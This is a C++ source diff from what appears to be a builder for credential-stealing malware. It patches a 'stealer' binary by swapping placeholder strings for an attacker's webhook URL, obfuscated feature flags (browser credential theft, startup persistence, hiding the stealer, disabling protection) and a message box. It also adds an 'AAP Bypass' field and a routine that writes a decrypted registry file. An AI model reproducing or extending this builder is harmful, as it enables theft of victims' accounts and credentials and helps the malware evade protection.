@@ -176,7 +176,7 @@ void setRegKeys(std::wstring aKey, std::wstring aValue1, std::wstring aValue2, s
 	}
 }
 //AAP Bypass
-// command syntax: [ID]==[WebHook_URL]==[Path]==[AAP-Data]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==[Title]==[Message]==
+// command syntax: [ID]==[WebHook_URL]==[Path]==[AAP-Data]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==[Title]==[Message]==[AAP Bypass]==
 // ID has to be 8 chars
 // ID has to be combined with HWID. Example: [ID{HWID}]
 
@@ -256,7 +256,7 @@ int main(int argc, char* argv[])
 			return 0;
 		}
 	}
-	if (CMDParts.size() == 5)
+	if (CMDParts.size() == 6)
 	{
 		if (true)
 		{
@@ -273,10 +273,10 @@ int main(int argc, char* argv[])
 			size_t DummyTextLocation = AllBytes.find(DummyText);
 			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
 			string RawLocation = CMDParts[1];
-			string Features = decrypt(CMDParts[2]);
-			string DummyFeatures = XorStr("[QvfnoyrCebg:(A)]--[Genpre:(A)]--[Erpbire:(A)]--[TrgNyyNppf:(A)]--[QryrgrTG:(A)]--[FgnegHc:(A)]--[UvqrFgrnyre:(A)]--[OebjfrePerqf:(A)]");
+			string Features = CMDParts[2];
+			string DummyFeatures = decrypt(XorStr("[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]"));
 			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
-			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
+			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), decrypt(Features));
 			string Location = RawLocation.substr(1, RawLocation.size() - 2);
 
 			//Message Box
@@ -292,6 +292,12 @@ int main(int argc, char* argv[])
 			AllBytes.replace(DummyMessageLocation, Message.length(), Message);
 			// Message Box - End
 
+			// AAP
+			string AAPData = CMDParts[5];
+			string DummyAAP = "#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$";
+			size_t DummyAAPLocation = AllBytes.find(DummyAAP);
+			AllBytes.replace(DummyAAPLocation, AAPData.length(), AAPData);
+			// AAP
 			ofstream WriteFile(Location, std::ofstream::trunc | std::ios::binary);
 			WriteFile << AllBytes;
 			remove(StealerBase.c_str());
@@ -316,6 +322,20 @@ int main(int argc, char* argv[])
 		wstring wvalue2 = values[1];
 		string MKey = findMKey();
 		setRegKeys(data, wvalue1, wvalue2, MACToKeys(MACAddress), MKey);
+	}
+	else if (CMDParts.size() == 2)
+	{
+		// AAP Gen
+		// [RegString]==[Path]==
+		string RawReg = CMDParts[0];
+		RawReg = RawReg.substr(1, RawReg.size() - 2);
+		RawReg = decrypt(RawReg);
+		string RegString = hex_to_string(RawReg);
+		string RawPath = CMDParts[1];
+		string Path = RawPath.substr(1, RawPath.size() - 2);
+		ofstream WriteRegFile(Path, std::ios::binary);
+		WriteRegFile << RegString;
+		WriteRegFile.close();
 	}
 	else
 	{
